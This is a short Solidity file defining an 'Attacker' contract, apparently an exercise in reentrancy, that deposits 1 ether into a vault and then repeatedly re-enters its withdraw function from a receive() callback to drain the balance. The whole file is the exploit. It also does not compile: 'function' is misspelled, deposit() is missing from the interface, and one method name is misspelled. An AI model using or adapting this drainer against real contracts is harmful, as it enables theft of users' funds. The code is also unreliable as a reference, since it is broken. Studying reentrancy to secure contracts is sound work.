// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function getBalance() external view returns ( uint256);
    function getContractBlance() external view returns (uint256);
    function withdraw() external;
}

contract Attacker {
    IVault public vault;
    constructor (address vaultAddress) {
        vault = IVault(vaultAddress);
    }

    fucntion attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    receive() external payable {
     if (address (vault).balance >=1) {
        vault.withdraw();
     }



    }
}